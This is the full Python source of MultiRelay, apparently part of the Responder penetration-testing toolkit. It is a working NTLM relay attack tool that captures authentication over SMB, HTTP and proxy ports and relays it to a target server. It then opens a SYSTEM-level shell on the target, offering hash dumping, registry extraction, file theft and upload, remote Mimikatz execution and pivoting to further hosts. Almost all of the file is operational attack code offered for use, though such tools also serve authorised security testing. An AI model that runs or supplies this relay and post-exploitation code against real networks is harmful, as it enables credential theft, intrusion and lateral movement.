#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys
import re
import os
import logging
import optparse
import time
import random
import subprocess
from threading import Thread
from socketserver import TCPServer, UDPServer, ThreadingMixIn, BaseRequestHandler
try:
    from Crypto.Hash import MD5
except ImportError:
    print ("\033[1;31m\nCrypto lib is not installed. You won't be able to live dump the hashes.")
    print ("You can install it on debian based os with this command: apt-get install python-crypto")
    print ("The Sam file will be saved anyway and you will have the bootkey.\033[0m\n")
try:
    import readline
except:
    print ("Warning: readline module is not available, you will not be able to use the arrow keys for command history")
    pass
from MultiRelay.RelayMultiPackets import *
from MultiRelay.RelayMultiCore import *

from SMBFinger.Finger import RunFinger,ShowSigning,RunPivotScan
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
from socket import *

__version__ = "2.0"


MimikatzFilename    = "./MultiRelay/bin/mimikatz.exe"
Mimikatzx86Filename = "./MultiRelay/bin/mimikatz_x86.exe"
RunAsFileName       = "./MultiRelay/bin/Runas.exe"
SysSVCFileName      = "./MultiRelay/bin/Syssvc.exe"


def UserCallBack(op, value, dmy, parser):
    args=[]
    for arg in parser.rargs:
        if arg[0] != "-":
            args.append(arg)
        if arg[0] == "-":
            break
    if getattr(parser.values, op.dest):
        args.extend(getattr(parser.values, op.dest))
    setattr(parser.values, op.dest, args)

parser = optparse.OptionParser(usage="\npython %prog -t 10.20.30.40 -u Administrator lgandx admin\npython %prog -t 10.20.30.40 -u ALL", version=__version__, prog=sys.argv[0])
parser.add_option('-t',action="store", help="Target server for SMB relay.",metavar="10.20.30.45",dest="TARGET")
parser.add_option('-p',action="store", help="Additional port to listen on, this will relay for proxy, http and webdav incoming packets.",metavar="8081",dest="ExtraPort")
parser.add_option('-u', '--UserToRelay', help="Users to relay. Use '-u ALL' to relay all users.", action="callback", callback=UserCallBack, dest="UserToRelay")
parser.add_option('-c', '--command', action="store", help="Single command to run (scripting)", metavar="whoami",dest="OneCommand")
parser.add_option('-d', '--dump', action="store_true", help="Dump hashes (scripting)", metavar="whoami",dest="Dump")

options, args = parser.parse_args()

if options.TARGET is None:
    print ("\n-t Mandatory option is missing, please provide a target.\n")
    parser.print_help()
    exit(-1)
if options.UserToRelay is None:
    print ("\n-u Mandatory option is missing, please provide a username to relay.\n")
    parser.print_help()
    exit(-1)
if options.ExtraPort is None:
    options.ExtraPort = 0

if not os.geteuid() == 0:
    print (color("[!] MultiRelay must be run as root."))
    sys.exit(-1)

OneCommand       = options.OneCommand
Dump             = options.Dump
ExtraPort        = options.ExtraPort
UserToRelay      = options.UserToRelay

Host             = [options.TARGET]
Cmd              = []
ShellOpen        = []
Pivoting         = [2]


def color(txt, code = 1, modifier = 0):
     return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)

def ShowWelcome():
     print (color('\nResponder MultiRelay %s NTLMv1/2 Relay' %(__version__),8,1))
     print ('\nSend bugs/hugs/comments to: laurent.gaffie@gmail.com')
     print ('Usernames to relay (-u) are case sensitive.')
     print ('To kill this script hit CTRL-C.\n')
     print (color('/*',8,1))
     print ('Use this script in combination with Responder.py for best results.')
     print ('Make sure to set SMB and HTTP to OFF in Responder.conf.\n')
     print ('This tool listen on TCP port 80, 3128 and 445.')
     print ('For optimal pwnage, launch Responder only with these 2 options:')
     print ('-rv\nAvoid running a command that will likely prompt for information like net use, etc.')
     print ('If you do so, use taskkill (as system) to kill the process.')
     print (color('*/',8,1))
     print (color('\nRelaying credentials for these users:',8,1))
     print (color(UserToRelay,4,1))
     print ('\n')


ShowWelcome()

def ShowHelp():
     print (color('Available commands:',8,0))
     print (color('dump',8,1)+'               -> Extract the SAM database and print hashes.')
     print (color('regdump KEY',8,1)+'        -> Dump an HKLM registry key (eg: regdump SYSTEM)')
     print (color('read Path_To_File',8,1)+'  -> Read a file (eg: read /windows/win.ini)')
     print (color('get  Path_To_File',8,1)+'  -> Download a file (eg: get users/administrator/desktop/password.txt)')
     print (color('delete Path_To_File',8,1)+'-> Delete a file (eg: delete /windows/temp/executable.exe)')
     print (color('upload Path_To_File',8,1)+'-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \\windows\\temp\\')
     print (color('runas  Command',8,1)+'     -> Run a command as the currently logged in user. (eg: runas whoami)')
     print (color('scan /24',8,1)+'           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to')
     print (color('pivot  IP address',8,1)+'  -> Connect to another host (eg: pivot 10.0.0.12)')
     print (color('mimi  command',8,1)+'      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)')
     print (color('mimi32  command',8,1)+'    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)')
     print (color('lcmd  command',8,1)+'      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)')
     print (color('help',8,1)+'               -> Print this message.')
     print (color('exit',8,1)+'               -> Exit this shell and return in relay mode.')
     print ('                      If you want to quit type exit and then use CTRL-C\n')
     print (color('Any other command than that will be run as SYSTEM on the target.\n',8,1))

Logs_Path = os.path.abspath(os.path.join(os.path.dirname(__file__)))+"/../"
Logs = logging
Logs.basicConfig(filemode="w",filename=Logs_Path+'logs/SMBRelay-Session.txt',level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')

def UploadContent(File):
    with file(File) as f:
        s = f.read()
    FileLen = len(s)
    FileContent = s
    return FileLen, FileContent

try:
    RunFinger(Host[0])
except:
    print ("The host %s seems to be down or port 445 down."%(Host[0]))
    sys.exit(1)


def get_command():
    global Cmd
    Cmd = []
    while any(x in Cmd for x in Cmd) is False:
       Cmd = [raw_input("C:\\Windows\\system32\\:#")]

#Function used to make sure no connections are accepted while we have an open shell.
#Used to avoid any possible broken pipe.
def IsShellOpen():
    #While there's nothing in our array return false.
    if any(x in ShellOpen for x in ShellOpen) is False:
       return False
    #If there is return True.
    else:
       return True

#Function used to make sure no connections are accepted on HTTP and HTTP_Proxy while we are pivoting.
def IsPivotOn():
    #While there's nothing in our array return false.
    if Pivoting[0] == "2":
       return False
    #If there is return True.
    if Pivoting[0] == "1":
       return True

def ConnectToTarget():
        try:
            s = socket(AF_INET, SOCK_STREAM)
            s.connect((Host[0],445))
            return s
        except:
            try:
                sys.exit(1)
                print ("Cannot connect to target, host down?")
            except:
                pass

class HTTPProxyRelay(BaseRequestHandler):

    def handle(self):

        try:
            #Don't handle requests while a shell is open. That's the goal after all.
            if IsShellOpen():
               return None
            if IsPivotOn():
               return None
        except:
            raise

        s = ConnectToTarget()
        try:
            data = self.request.recv(8092)
            ##First we check if it's a Webdav OPTION request.
            Webdav = ServeOPTIONS(data)
            if Webdav:
                #If it is, send the option answer, we'll send him to auth when we receive a profind.
                self.request.send(Webdav)
                data = self.request.recv(4096)

            NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
            ##Make sure incoming packet is an NTLM auth, if not send HTTP 407.
            if NTLM_Auth:
                #Get NTLM Message code. (1:negotiate, 2:challenge, 3:auth)
                Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]

            if Packet_NTLM == "\x01":
                ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
                h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x43\xc8")
                n = SMBNegoCairo(Data = SMBNegoCairoData())
                n.calculate()
                packet0 = str(h)+str(n)
                buffer0 = longueur(packet0)+packet0
                s.send(buffer0)
                smbdata = s.recv(2048)
                ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
                if smbdata[8:10] == "\x72\x00":
                    head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",mid="\x02\x00")
                    t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
                    t.calculate()
                    packet1 = str(head)+str(t)
                    buffer1 = longueur(packet1)+packet1
                    s.send(buffer1)
                    smbdata = s.recv(2048) #got it here.

                    ## Send HTTP Proxy
                    Buffer_Ans = WPAD_NTLM_Challenge_Ans()
                    Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
                    key = ExtractHTTPChallenge(smbdata,Pivoting)#Grab challenge key for later use (hash parsing).
                    self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
                    data = self.request.recv(8092)
                    NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
                    Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]

                    ##Got NTLM Message 3 from client.
                    if Packet_NTLM == "\x03":
                        NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
                        ##Might be anonymous, verify it and if so, send no go to client.
                        if IsSMBAnonymous(NTLM_Auth):
                            Response = WPAD_Auth_407_Ans()
                            self.request.send(str(Response))
                            data = self.request.recv(8092)
                        else:
                            #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
                            #and has not attempted before. While at it, let's grab his hash.
                            Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host[0],Pivoting)

                            if Username is not None:
                                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",uid=smbdata[32:34],mid="\x03\x00")
                                t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)#Final relay.
                                t.calculate()
                                packet1 = str(head)+str(t)
                                buffer1 = longueur(packet1)+packet1
                                print ("[+] SMB Session Auth sent.")
                                s.send(buffer1)
                                smbdata = s.recv(2048)
                                RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
                                if RunCmd is None:
                                   s.close()
                                   self.request.close()
                                   return None

            else:
                ##Any other type of request, send a 407.
                Response = WPAD_Auth_407_Ans()
                self.request.send(str(Response))

        except Exception:
            self.request.close()
            ##No need to print anything (timeouts, rst, etc) to the user console..
            pass


class HTTPRelay(BaseRequestHandler):

    def handle(self):

        try:
            #Don't handle requests while a shell is open. That's the goal after all.
            if IsShellOpen():
               return None
            if IsPivotOn():
               return None
        except:
            raise

        try:
            s = ConnectToTarget()

            data = self.request.recv(8092)
            ##First we check if it's a Webdav OPTION request.
            Webdav = ServeOPTIONS(data)
            if Webdav:
                #If it is, send the option answer, we'll send him to auth when we receive a profind.
                self.request.send(Webdav)
                data = self.request.recv(4096)

            NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
            ##Make sure incoming packet is an NTLM auth, if not send HTTP 407.
            if NTLM_Auth:
                #Get NTLM Message code. (1:negotiate, 2:challenge, 3:auth)
                Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]

                if Packet_NTLM == "\x01":
                    ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
                    h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x43\xc8")
                    n = SMBNegoCairo(Data = SMBNegoCairoData())
                    n.calculate()
                    packet0 = str(h)+str(n)
                    buffer0 = longueur(packet0)+packet0
                    s.send(buffer0)
                    smbdata = s.recv(2048)
                    ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
                    if smbdata[8:10] == "\x72\x00":
                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",mid="\x02\x00")
                        t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
                        t.calculate()
                        packet1 = str(head)+str(t)
                        buffer1 = longueur(packet1)+packet1
                        s.send(buffer1)
                        smbdata = s.recv(2048) #got it here.

                    ## Send HTTP Response.
                    Buffer_Ans = IIS_NTLM_Challenge_Ans()
                    Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
                    key = ExtractHTTPChallenge(smbdata,Pivoting)#Grab challenge key for later use (hash parsing).
                    self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
                    data = self.request.recv(8092)
                    NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
                    Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]

                    ##Got NTLM Message 3 from client.
                    if Packet_NTLM == "\x03":
                        NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
                        ##Might be anonymous, verify it and if so, send no go to client.
                        if IsSMBAnonymous(NTLM_Auth):
                            Response = IIS_Auth_401_Ans()
                            self.request.send(str(Response))
                            data = self.request.recv(8092)
                        else:
                            #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
                            #and has not attempted before. While at it, let's grab his hash.
                            Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host[0],Pivoting)

                            if Username is not None:
                                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",uid=smbdata[32:34],mid="\x03\x00")
                                t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)#Final relay.
                                t.calculate()
                                packet1 = str(head)+str(t)
                                buffer1 = longueur(packet1)+packet1
                                print ("[+] SMB Session Auth sent.")
                                s.send(buffer1)
                                smbdata = s.recv(2048)
                                RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
                                if RunCmd is None:
                                   s.close()
                                   self.request.close()
                                   return None

            else:
                ##Any other type of request, send a 401.
                Response = IIS_Auth_401_Ans()
                self.request.send(str(Response))


        except Exception:
            self.request.close()
            ##No need to print anything (timeouts, rst, etc) to the user console..
            pass

class SMBRelay(BaseRequestHandler):

    def handle(self):

        try:
            #Don't handle requests while a shell is open. That's the goal after all.
            if IsShellOpen():
               return None
        except:
            raise

        s = ConnectToTarget()
        try:
            data = self.request.recv(4096)

            ##Negotiate proto answer. That's us.
            if data[8:10] == "\x72\x00":
                head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x43\xc8", pid=pidcalc(data),mid=midcalc(data))
                t = SMBRelayNegoAns(Dialect=Parse_Nego_Dialect(data))
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1
                self.request.send(buffer1)
                data = self.request.recv(4096)

            ## Make sure it's not a Kerberos auth.
            if data.find("NTLM") != -1:
               ## Start with nego protocol + session setup negotiate to our target.
               data, smbdata, s, challenge = GrabNegotiateFromTarget(data, s, Pivoting)

            ## Make sure it's not a Kerberos auth.
            if data.find("NTLM") != -1:
                ##Relay all that to our client.
                if data[8:10] == "\x73\x00":
                   head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x43\xc8", errorcode="\x16\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
                   #NTLMv2 MIC calculation is a concat of all 3 NTLM (nego,challenge,auth) messages exchange.
                   #Then simply grab the whole session setup packet except the smb header from the client and pass it to the server.
                   t = smbdata[36:]
                   packet0 = str(head)+str(t)
                   buffer0 = longueur(packet0)+packet0
                   self.request.send(buffer0)
                   data = self.request.recv(4096)
            else:
               #if it's kerberos, ditch the connection.
               s.close()
               return None

            if IsSMBAnonymous(data):
                ##Send logon failure for anonymous logins.
                head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x43\xc8", errorcode="\x6d\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
                t = SMBSessEmpty()
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1
                self.request.send(buffer1)
                s.close()
                return None

            else:
                #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
                #and has not attempted before. While at it, let's grab his hash.
                Username, Domain = ParseSMBHash(data,self.client_address[0],challenge,UserToRelay,Host[0],Pivoting)
                if Username is not None:
                    ##Got the ntlm message 3, send it over to SMB.
                    head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",uid=smbdata[32:34],mid="\x03\x00")
                    t = data[36:]#Final relay.
                    packet1 = str(head)+str(t)
                    buffer1 = longueur(packet1)+packet1
                    if Pivoting[0] == "1":
                       pass
                    else:
                       print ("[+] SMB Session Auth sent.")
                    s.send(buffer1)
                    smbdata = s.recv(4096)
                    #We're all set, dropping into shell.
                    RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
                    #If runcmd is None it's because tree connect was denied for this user.
                    #This will only happen once with that specific user account.
                    #Let's kill that connection so we can force him to reauth with another account.
                    if RunCmd is None:
                        s.close()
                        return None

                else:
                   ##Send logon failure, so our client might authenticate with another account.
                   head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x43\xc8", errorcode="\x6d\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
                   t = SMBSessEmpty()
                   packet1 = str(head)+str(t)
                   buffer1 = longueur(packet1)+packet1
                   self.request.send(buffer1)
                   data = self.request.recv(4096)
                   self.request.close()
                   return None

        except Exception:
            self.request.close()
            ##No need to print anything (timeouts, rst, etc) to the user console..
            pass


#Interface starts here.
def RunShellCmd(data, s, clientIP, Target, Username, Domain):

    #Let's declare our globals here..
    #Pivoting gets used when the pivot cmd is used, it let us figure out in which mode is MultiRelay. Initial Relay or Pivot mode.
    global Pivoting
    #Update Host, when pivoting is used.
    global Host
    #Make sure we don't open 2 shell at the same time..
    global ShellOpen
    ShellOpen = ["Shell is open"]

    # On this block we do some verifications before dropping the user into the shell.
    if data[8:10] == "\x73\x6d":
        print ("[+] Relay failed, Logon Failure. This user doesn't have an account on this target.")
        print ("[+] Hashes were saved anyways in Responder/logs/ folder.\n")
        Logs.info(clientIP+":"+Username+":"+Domain+":"+Target[0]+":Logon Failure")
        del ShellOpen[:]
        return False

    if data[8:10] == "\x73\x8d":
        print ("[+] Relay failed, STATUS_TRUSTED_RELATIONSHIP_FAILURE returned. Credentials are good, but user is probably not using the target domain name in his credentials.\n")
        Logs.info(clientIP+":"+Username+":"+Domain+":"+Target[0]+":Logon Failure")
        del ShellOpen[:]
        return False

    if data[8:10] == "\x73\x5e":
        print ("[+] Relay failed, NO_LOGON_SERVER returned. Credentials are probably good, but the PDC is either offline or inexistant.\n")
        del ShellOpen[:]
        return False

    ## Ok, we are supposed to be authenticated here, so first check if user has admin privs on C$:
    ## Tree Connect
    if data[8:10] == "\x73\x00":
        GetSessionResponseFlags(data)#While at it, verify if the target has returned a guest session.
        head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x43\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        t = SMBTreeConnectData(Path="\\\\"+Target[0]+"\\C$")
        t.calculate()
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1
        s.send(buffer1)
        data = s.recv(2048)

    ## Nope he doesn't.
    if data[8:10] == "\x75\x22":
        if Pivoting[0] == "1":
           pass
        else:
           print ("[+] Relay Failed, Tree Connect AndX denied. This is a low privileged user or SMB Signing is mandatory.\n[+] Hashes were saved anyways in Responder/logs/ folder.\n")
           Logs.info(clientIP+":"+Username+":"+Domain+":"+Target[0]+":Logon Failure")
        del ShellOpen[:]
        return False

    # This one should not happen since we always use the IP address of the target in our tree connects, but just in case..
    if data[8:10] == "\x75\xcc":
        print ("[+] Tree Connect AndX denied. Bad Network Name returned.")
        del ShellOpen[:]
        return False

    ## Tree Connect on C$ is successfull.
    if data[8:10] == "\x75\x00":
        if Pivoting[0] == "1":
           pass
        else:
           print ("[+] Looks good, "+Username+" has admin rights on C$.")
        head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        t = SMBTreeConnectData(Path="\\\\"+Target[0]+"\\IPC$")
        t.calculate()
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1
        s.send(buffer1)
        data = s.recv(2048)

    ## Run one command.
    if data[8:10] == "\x75\x00" and OneCommand != None or Dump:
        print ("[+] Authenticated.")
        if OneCommand != None:
           print ("[+] Running command: %s"%(OneCommand))
           RunCmd(data, s, clientIP, Username, Domain, OneCommand, Logs, Target[0])
        if Dump:
           print ("[+] Dumping hashes")
           DumpHashes(data, s, Target[0])
        os._exit(1)

    ## Drop into the shell.
    if data[8:10] == "\x75\x00" and OneCommand == None:
        if Pivoting[0] == "1":
           pass
        else:
           print ("[+] Authenticated.\n[+] Dropping into Responder's interactive shell, type \"exit\" to terminate\n")
           ShowHelp()
        Logs.info("Client:"+clientIP+", "+Domain+"\\"+Username+" --> Target: "+Target[0]+" -> Shell acquired")
        print (color('Connected to %s as LocalSystem.'%(Target[0]),2,1))

    while True:

        ## We either just arrived here or we're back from a command operation, let's setup some stuff.
        if data[8:10] == "\x75\x00":
            #start a thread for raw_input, so we can do other stuff while we wait for a command.
            t = Thread(target=get_command, args=())
            t.daemon = True
            t.start()

            #Use SMB Pings to maintain our connection alive. Once in a while we perform a dumb read operation
            #to maintain MultiRelay alive and well.
            count = 0
            DoEvery = random.randint(10, 45)
            while any(x in Cmd for x in Cmd) is False:
                count = count+1
                SMBKeepAlive(s, data)
                if count == DoEvery:
                   DumbSMBChain(data, s, Target[0])
                   count = 0
                if any(x in Cmd for x in Cmd) is True:
                   break

            ##Grab the commands. Cmd is global in get_command().
            DumpReg = re.findall('^dump', Cmd[0])
            Read    = re.findall('^read (.*)$', Cmd[0])
            RegDump = re.findall('^regdump (.*)$', Cmd[0])
            Get     = re.findall('^get (.*)$', Cmd[0])
            Upload  = re.findall('^upload (.*)$', Cmd[0])
            Delete  = re.findall('^delete (.*)$', Cmd[0])
            RunAs   = re.findall('^runas (.*)$', Cmd[0])
            LCmd    = re.findall('^lcmd (.*)$', Cmd[0])
            Mimi    = re.findall('^mimi (.*)$', Cmd[0])
            Mimi32  = re.findall('^mimi32 (.*)$', Cmd[0])
            Scan    = re.findall('^scan (.*)$', Cmd[0])
            Pivot   = re.findall('^pivot (.*)$', Cmd[0])
            Help    = re.findall('^help', Cmd[0])

            if Cmd[0] == "exit":
               print ("[+] Returning in relay mode.")
               del Cmd[:]
               del ShellOpen[:]
               return None

            ##For all of the following commands we send the data (var: data) returned by the
            ##tree connect IPC$ answer and the socket (var: s) to our operation function in RelayMultiCore.
            ##We also clean up the command array when done.
            if DumpReg:
               data = DumpHashes(data, s, Target[0])
               del Cmd[:]

            if Read:
               File = Read[0]
               data = ReadFile(data, s, File, Target[0])
               del Cmd[:]

            if Get:
               File = Get[0]
               data = GetAfFile(data, s, File, Target[0])
               del Cmd[:]

            if Upload:
               File = Upload[0]
               if os.path.isfile(File):
                  FileSize, FileContent = UploadContent(File)
                  File = os.path.basename(File)
                  data = WriteFile(data, s, File,  FileSize, FileContent, Target[0])
                  del Cmd[:]
               else:
                  print (File+" does not exist, please specify a valid file.")
                  del Cmd[:]

            if Delete:
               Filename = Delete[0]
               data = DeleteFile(data, s, Filename, Target[0])
               del Cmd[:]

            if RegDump:
               Key = RegDump[0]
               data = SaveAKey(data, s, Target[0], Key)
               del Cmd[:]

            if RunAs:
               if os.path.isfile(RunAsFileName):
                  FileSize, FileContent = UploadContent(RunAsFileName)
                  FileName = os.path.basename(RunAsFileName)
                  data = WriteFile(data, s, FileName,  FileSize, FileContent, Target[0])
                  Exec = RunAs[0]
                  data = RunAsCmd(data, s, clientIP, Username, Domain, Exec, Logs, Target[0], FileName)
                  del Cmd[:]
               else:
                  print (RunAsFileName+" does not exist, please specify a valid file.")
                  del Cmd[:]

            if LCmd:
               subprocess.call(LCmd[0], shell=True)
               del Cmd[:]

            if Mimi:
               if os.path.isfile(MimikatzFilename):
                  FileSize, FileContent = UploadContent(MimikatzFilename)
                  FileName = os.path.basename(MimikatzFilename)
                  data = WriteFile(data, s, FileName,  FileSize, FileContent, Target[0])
                  Exec = Mimi[0]
                  data = RunMimiCmd(data, s, clientIP, Username, Domain, Exec, Logs, Target[0],FileName)
                  del Cmd[:]
               else:
                  print (MimikatzFilename+" does not exist, please specify a valid file.")
                  del Cmd[:]

            if Mimi32:
               if os.path.isfile(Mimikatzx86Filename):
                  FileSize, FileContent = UploadContent(Mimikatzx86Filename)
                  FileName = os.path.basename(Mimikatzx86Filename)
                  data = WriteFile(data, s, FileName,  FileSize, FileContent, Target[0])
                  Exec = Mimi32[0]
                  data = RunMimiCmd(data, s, clientIP, Username, Domain, Exec, Logs, Target[0],FileName)
                  del Cmd[:]
               else:
                  print (Mimikatzx86Filename+" does not exist, please specify a valid file.")
                  del Cmd[:]

            if Pivot:
               if Pivot[0] == Target[0]:
                  print ("[Pivot Verification Failed]: You're already on this host. No need to pivot.")
                  del Pivot[:]
                  del Cmd[:]
               else:
                  if ShowSigning(Pivot[0]):
                     del Pivot[:]
                     del Cmd[:]
                  else:
                     if os.path.isfile(RunAsFileName):
                        FileSize, FileContent = UploadContent(RunAsFileName)
                        FileName = os.path.basename(RunAsFileName)
                        data = WriteFile(data, s, FileName,  FileSize, FileContent, Target[0])
                        RunAsPath = '%windir%\\Temp\\'+FileName
                        Status, data = VerifyPivot(data, s, clientIP, Username, Domain, Pivot[0], Logs, Target[0], RunAsPath, FileName)

                        if Status == True:
                           print ("[+] Pivoting to %s."%(Pivot[0]))
                           if os.path.isfile(RunAsFileName):
                              FileSize, FileContent = UploadContent(RunAsFileName)
                              data = WriteFile(data, s, FileName,  FileSize, FileContent, Target[0])
                              #shell will close.
                              del ShellOpen[:]
                              #update the new host.
                              Host = [Pivot[0]]
                              #we're in pivoting mode.
                              Pivoting = ["1"]
                              data = PivotToOtherHost(data, s, clientIP, Username, Domain, Logs, Target[0], RunAsPath, FileName)
                              del Cmd[:]
                              s.close()
                              return None

                        if Status == False:
                           print ("[Pivot Verification Failed]: This user doesn't have enough privileges on "+Pivot[0]+" to pivot. Try another host.")
                           del Cmd[:]
                           del Pivot[:]
                     else:
                        print (RunAsFileName+" does not exist, please specify a valid file.")
                        del Cmd[:]

            if Scan:
               LocalIp = FindLocalIp()
               Range = ConvertToClassC(Target[0], Scan[0])
               RunPivotScan(Range, Target[0])
               del Cmd[:]

            if Help:
               ShowHelp()
               del Cmd[:]

            ##Let go with the command.
            if any(x in Cmd for x in Cmd):
                if len(Cmd[0]) > 1:
                   if os.path.isfile(SysSVCFileName):
                      FileSize, FileContent = UploadContent(SysSVCFileName)
                      FileName = os.path.basename(SysSVCFileName)
                      RunPath = '%windir%\\Temp\\'+FileName
                      data = WriteFile(data, s, FileName,  FileSize, FileContent, Target[0])
                      data = RunCmd(data, s, clientIP, Username, Domain, Cmd[0], Logs, Target[0], RunPath,FileName)
                      del Cmd[:]
                   else:
                      print (SysSVCFileName+" does not exist, please specify a valid file.")
                      del Cmd[:]

        if data is None:
           print ("\033[1;31m\nSomething went wrong, the server dropped the connection.\nMake sure (\\Windows\\Temp\\) is clean on the server\033[0m\n")

        if data[8:10] == "\x2d\x34":#We confirmed with OpenAndX that no file remains after the execution of the last command. We send a tree connect IPC and land at the begining of the command loop.
            head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
            t = SMBTreeConnectData(Path="\\\\"+Target[0]+"\\IPC$")#
            t.calculate()
            packet1 = str(head)+str(t)
            buffer1 = longueur(packet1)+packet1
            s.send(buffer1)
            data = s.recv(2048)

class ThreadingTCPServer(TCPServer):
     def server_bind(self):
          TCPServer.server_bind(self)

ThreadingTCPServer.allow_reuse_address = 1
ThreadingTCPServer.daemon_threads = True

def serve_thread_tcp(host, port, handler):
     try:
          server = ThreadingTCPServer((host, port), handler)
          server.serve_forever()
     except:
          print (color('Error starting TCP server on port '+str(port)+ ', check permissions or other servers running.', 1, 1))

def main():
     try:
          threads = []
          threads.append(Thread(target=serve_thread_tcp, args=('', 445, SMBRelay,)))
          threads.append(Thread(target=serve_thread_tcp, args=('', 3128, HTTPProxyRelay,)))
          threads.append(Thread(target=serve_thread_tcp, args=('', 80, HTTPRelay,)))
          if ExtraPort != 0:
             threads.append(Thread(target=serve_thread_tcp, args=('', int(ExtraPort), HTTPProxyRelay,)))
          for thread in threads:
               thread.setDaemon(True)
               thread.start()

          while True:
               time.sleep(1)

     except (KeyboardInterrupt, SystemExit):
          ##If we reached here after a MultiRelay shell interaction, we need to reset the terminal to its default.
          ##This is a bug in python readline when dealing with raw_input()..
          if ShellOpen:
             os.system('stty sane')
          ##Then exit
          sys.exit("\rExiting...")

if __name__ == '__main__':
     main()
